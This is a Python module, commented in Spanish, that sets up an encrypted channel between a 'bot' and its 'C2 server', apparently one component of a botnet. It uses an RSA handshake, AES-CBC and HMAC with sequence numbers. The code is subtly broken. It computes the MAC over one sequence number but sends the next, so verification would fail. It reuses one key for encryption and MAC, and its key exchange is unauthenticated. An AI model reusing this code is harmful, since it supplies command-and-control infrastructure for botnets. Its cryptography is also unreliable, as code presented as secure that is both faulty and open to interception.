"""
Módulo de comunicaciones seguras.
Proporciona una capa de cifrado y autenticación para las comunicaciones
entre el bot y el servidor C2.
"""

import socket
import ssl
import base64
import json
import os
import time
import threading
from typing import Optional, Dict, Any, Tuple
import logging

from cryptography.hazmat.primitives import (
    padding, 
    hashes, 
    hmac, 
    serialization
)
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.backends import default_backend

class SecureChannel:
    def __init__(self, is_server: bool = False):
        """
        Inicializa el canal seguro.
        
        Args:
            is_server (bool): True si es el servidor, False si es cliente
        """
        self.is_server = is_server
        self.session_key = None
        self.private_key = None
        self.public_key = None
        self.remote_public_key = None
        self.sequence_number = 0
        self.remote_sequence = 0
        self._generate_keys()

    def _generate_keys(self) -> None:
        """Genera par de claves RSA para el intercambio inicial."""
        try:
            self.private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )
            self.public_key = self.private_key.public_key()
        except Exception as e:
            logging.error(f"Error generando claves: {e}")
            raise

    def establish_secure_connection(self, sock: socket.socket) -> bool:
        """
        Establece una conexión segura con intercambio de claves.
        
        Args:
            sock (socket.socket): Socket para la conexión
            
        Returns:
            bool: True si la conexión se estableció correctamente
        """
        try:
            if self.is_server:
                return self._server_handshake(sock)
            else:
                return self._client_handshake(sock)
        except Exception as e:
            logging.error(f"Error en establecimiento de conexión: {e}")
            return False

    def _server_handshake(self, sock: socket.socket) -> bool:
        """Realiza el handshake desde el lado del servidor."""
        try:
            # 1. Enviar nuestro certificado/clave pública
            public_bytes = self.public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            sock.sendall(public_bytes)
            
            # 2. Recibir clave pública del cliente
            client_key_bytes = sock.recv(4096)
            self.remote_public_key = serialization.load_pem_public_key(
                client_key_bytes,
                backend=default_backend()
            )
            
            # 3. Recibir clave de sesión cifrada
            encrypted_session_key = sock.recv(512)
            self.session_key = self.private_key.decrypt(
                encrypted_session_key,
                asym_padding.OAEP(
                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            return True
        except Exception as e:
            logging.error(f"Error en handshake del servidor: {e}")
            return False

    def _client_handshake(self, sock: socket.socket) -> bool:
        """Realiza el handshake desde el lado del cliente."""
        try:
            # 1. Recibir clave pública del servidor
            server_key_bytes = sock.recv(4096)
            self.remote_public_key = serialization.load_pem_public_key(
                server_key_bytes,
                backend=default_backend()
            )
            
            # 2. Enviar nuestra clave pública
            public_bytes = self.public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            sock.sendall(public_bytes)
            
            # 3. Generar y enviar clave de sesión
            self.session_key = os.urandom(32)
            encrypted_session_key = self.remote_public_key.encrypt(
                self.session_key,
                asym_padding.OAEP(
                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            sock.sendall(encrypted_session_key)
            
            return True
        except Exception as e:
            logging.error(f"Error en handshake del cliente: {e}")
            return False

    def encrypt_message(self, message: bytes) -> bytes:
        """
        Cifra un mensaje usando la clave de sesión.
        
        Args:
            message (bytes): Mensaje a cifrar
            
        Returns:
            bytes: Mensaje cifrado con MAC y número de secuencia
        """
        try:
            # Generar IV aleatorio
            iv = os.urandom(16)
            
            # Crear cipher
            cipher = Cipher(
                algorithms.AES(self.session_key),
                modes.CBC(iv),
                backend=default_backend()
            )
            
            # Añadir padding
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(message) + padder.finalize()
            
            # Cifrar
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            
            # Crear MAC
            h = hmac.HMAC(self.session_key, hashes.SHA256(), backend=default_backend())
            h.update(iv + ciphertext + self.sequence_number.to_bytes(8, 'big'))
            mac = h.finalize()
            
            # Incrementar número de secuencia
            self.sequence_number += 1
            
            # Formato final: IV + ciphertext + MAC + sequence_number
            return iv + ciphertext + mac + self.sequence_number.to_bytes(8, 'big')
            
        except Exception as e:
            logging.error(f"Error cifrando mensaje: {e}")
            raise

    def decrypt_message(self, encrypted_message: bytes) -> Optional[bytes]:
        """
        Descifra un mensaje.
        
        Args:
            encrypted_message (bytes): Mensaje cifrado
            
        Returns:
            Optional[bytes]: Mensaje descifrado o None si hay error
        """
        try:
            # Separar componentes
            iv = encrypted_message[:16]
            mac = encrypted_message[-40:-8]
            received_sequence = int.from_bytes(encrypted_message[-8:], 'big')
            ciphertext = encrypted_message[16:-40]
            
            # Verificar secuencia
            if received_sequence <= self.remote_sequence:
                logging.warning("Posible ataque de replay detectado")
                return None
            self.remote_sequence = received_sequence
            
            # Verificar MAC
            h = hmac.HMAC(self.session_key, hashes.SHA256(), backend=default_backend())
            h.update(iv + ciphertext + received_sequence.to_bytes(8, 'big'))
            try:
                h.verify(mac)
            except:
                logging.warning("MAC inválido - posible manipulación")
                return None
            
            # Descifrar
            cipher = Cipher(
                algorithms.AES(self.session_key),
                modes.CBC(iv),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Quitar padding
            unpadder = padding.PKCS7(128).unpadder()
            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
            
            return plaintext
            
        except Exception as e:
            logging.error(f"Error descifrando mensaje: {e}")
            return None

    def send_secure(self, sock: socket.socket, data: bytes) -> bool:
        """
        Envía datos de forma segura.
        
        Args:
            sock (socket.socket): Socket para enviar
            data (bytes): Datos a enviar
            
        Returns:
            bool: True si se envió correctamente
        """
        try:
            encrypted = self.encrypt_message(data)
            length = len(encrypted).to_bytes(4, 'big')
            sock.sendall(length + encrypted)
            return True
        except Exception as e:
            logging.error(f"Error enviando datos seguros: {e}")
            return False

    def receive_secure(self, sock: socket.socket) -> Optional[bytes]:
        """
        Recibe datos de forma segura.
        
        Args:
            sock (socket.socket): Socket para recibir
            
        Returns:
            Optional[bytes]: Datos recibidos o None si hay error
        """
        try:
            # Recibir longitud
            length_bytes = sock.recv(4)
            if not length_bytes:
                return None
            length = int.from_bytes(length_bytes, 'big')
            
            # Recibir datos
            data = b""
            while len(data) < length:
                chunk = sock.recv(min(4096, length - len(data)))
                if not chunk:
                    return None
                data += chunk
            
            # Descifrar
            return self.decrypt_message(data)
            
        except Exception as e:
            logging.error(f"Error recibiendo datos seguros: {e}")
            return None
